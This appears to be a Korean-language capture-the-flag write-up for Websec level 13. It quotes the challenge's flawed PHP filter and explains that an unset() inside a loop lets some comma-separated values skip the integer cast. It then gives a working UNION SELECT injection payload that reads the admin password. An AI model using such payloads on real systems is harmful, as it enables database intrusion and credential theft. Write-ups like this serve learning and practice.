---
title : "Websec - Level 13"
categories : [Wargame, Websec]
tags: [SQLi]
---

## Level 13
<hr style="border-top: 1px solid;"><br>

``` php
$db->exec('CREATE TABLE users (
  user_id   INTEGER PRIMARY KEY,
  user_name TEXT NOT NULL,
  user_privileges INTEGER NOT NULL,
  user_password TEXT NOT NULL
)');                            // users table

$db->prepare("INSERT INTO users VALUES(0, 'admin', 0, '$flag');")->execute();

if (isset($_GET['ids'])) {
    if ( ! is_string($_GET['ids'])) {
        die("Don't be silly.");
    }

    if ( strlen($_GET['ids']) > 70) {
        die("Please don't check all the privileges at once.");
    }

  $tmp = explode(',',$_GET['ids']);
  for ($i = 0; $i < count($tmp); $i++ ) {
        $tmp[$i] = (int)$tmp[$i];
        if( $tmp[$i] < 1 ) {
            unset($tmp[$i]);
        }
}
$selector = implode(',', array_unique($tmp));
$query = "SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (" . $selector . "));";
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

로컬에 코드를 복사를 해와서 여러가지를 넣다가 ','의 개수에 따라 for문에서 오류가 나오는 것을 발견을 함.

간단하게 확인을 하면, 값으로 ```,a```를 주면 ```$selector```의 값은 a가 됨.

<br>

','가 3개일 때 원하는 문자열이 나오는 것을 확인함.  
: ```,,,1)) union select 1,2,user_password from users-- ```

<br><br>
<hr style="border: 2px solid;">
<br><br>
